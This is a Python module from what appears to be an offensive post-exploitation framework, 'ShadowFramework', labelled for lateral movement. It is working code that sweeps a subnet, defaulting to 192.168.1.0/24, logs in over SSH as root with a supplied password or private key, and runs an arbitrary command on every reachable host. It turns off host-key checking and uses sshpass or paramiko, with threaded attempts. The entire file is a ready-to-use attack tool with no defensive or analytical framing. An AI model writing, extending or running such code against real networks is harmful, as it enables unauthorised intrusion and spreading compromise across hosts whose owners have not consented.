"""
ShadowFramework — Lateral Movement
SSH/WinRM lateral movement using built-in libraries with paramiko fallback.
"""
import socket
import subprocess
import os
import glob
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from rich.console import Console
from rich.table import Table
from utils.logger import log_action

console = Console()

# Try paramiko, fall back to subprocess ssh
try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False


class Module:
    MODULE_INFO = {
        'name': 'post/lateral_move',
        'description': 'Lateral movement via SSH (paramiko or system ssh). Spread to adjacent hosts.',
        'options': {
            'TARGETS':  'Comma-separated IPs or CIDR [default: 192.168.1.0/24]',
            'USER':     'SSH username [default: root]',
            'PASS':     'SSH password (optional)',
            'KEY_FILE': 'SSH private key path (optional)',
            'PORT':     'SSH port [default: 22]',
            'COMMAND':  'Command to execute on remote hosts [default: id]',
            'THREADS':  'Concurrent attempts [default: 10]',
            'TIMEOUT':  'Connection timeout [default: 5]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def _parse_targets(self, target_str):
        """Parse comma-separated IPs or single CIDR into list."""
        targets = []
        for t in target_str.split(','):
            t = t.strip()
            if '/' in t:
                # Simple CIDR expansion for /24
                parts = t.split('/')
                prefix = int(parts[1])
                base = parts[0].rsplit('.', 1)
                if prefix == 24:
                    for i in range(1, 255):
                        targets.append(f"{base[0]}.{i}")
                else:
                    targets.append(t)
            else:
                targets.append(t)
        return targets

    def _try_paramiko(self, host, port, user, password, key_file, command, timeout):
        """SSH via paramiko library."""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            kwargs = {'hostname': host, 'port': port, 'username': user, 'timeout': timeout}
            if key_file and os.path.exists(key_file):
                kwargs['key_filename'] = key_file
            elif password:
                kwargs['password'] = password
            else:
                return None, "No credentials"

            client.connect(**kwargs)
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            output = stdout.read().decode(errors='ignore').strip()
            err = stderr.read().decode(errors='ignore').strip()
            client.close()

            return output or err, None
        except paramiko.AuthenticationException:
            return None, "Auth failed"
        except Exception as e:
            return None, str(e)

    def _try_system_ssh(self, host, port, user, password, key_file, command, timeout):
        """SSH via system ssh command."""
        cmd = ['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'BatchMode=yes',
               '-o', f'ConnectTimeout={timeout}', '-p', str(port)]
        
        if key_file and os.path.exists(key_file):
            cmd.extend(['-i', key_file])

        cmd.extend([f'{user}@{host}', command])

        try:
            if password and not key_file:
                # Try sshpass if available
                result = subprocess.run(
                    ['sshpass', '-p', password] + cmd,
                    capture_output=True, text=True, timeout=timeout + 5
                )
            else:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 5)

            if result.returncode == 0:
                return result.stdout.strip(), None
            return None, result.stderr.strip()[:100]
        except FileNotFoundError:
            return None, "ssh/sshpass not found"
        except Exception as e:
            return None, str(e)

    def _attempt_host(self, host, port, user, password, key_file, command, timeout):
        """Try to execute command on a single host."""
        # Quick port check first
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            if s.connect_ex((host, port)) != 0:
                s.close()
                return host, None, "Port closed"
            s.close()
        except Exception:
            return host, None, "Unreachable"

        if HAS_PARAMIKO:
            output, err = self._try_paramiko(host, port, user, password, key_file, command, timeout)
        else:
            output, err = self._try_system_ssh(host, port, user, password, key_file, command, timeout)

        return host, output, err

    def run(self):
        target_str = self.framework.options.get('TARGETS', '192.168.1.0/24')
        user = self.framework.options.get('USER', 'root')
        password = self.framework.options.get('PASS', '')
        key_file = self.framework.options.get('KEY_FILE', '')
        port = int(self.framework.options.get('PORT', '22'))
        command = self.framework.options.get('COMMAND', 'id')
        threads = int(self.framework.options.get('THREADS', '10'))
        timeout = int(self.framework.options.get('TIMEOUT', '5'))

        targets = self._parse_targets(target_str)

        if not HAS_PARAMIKO:
            console.print("[yellow][!] paramiko not installed — using system ssh/sshpass.[/yellow]")

        console.print(f"[cyan][*] Lateral movement: {len(targets)} targets, cmd='{command}'[/cyan]")
        log_action(f"Lateral move: {len(targets)} targets as {user}")

        results = []
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(self._attempt_host, h, port, user, password, key_file, command, timeout): h
                       for h in targets}
            for future in as_completed(futures):
                host, output, err = future.result()
                if output:
                    console.print(f"  [green][+] {host}: {output[:80]}[/green]")
                    results.append((host, output))
                    log_action(f"Lateral: {host} → {output[:50]}")

        # Results table
        if results:
            table = Table(title=f"Lateral Movement Results ({len(results)}/{len(targets)} hosts)")
            table.add_column("Host", style="cyan")
            table.add_column("Output", style="green")
            for host, output in results:
                table.add_row(host, output[:100])
            console.print(table)
        else:
            console.print("[yellow][!] No hosts accessible with provided credentials.[/yellow]")
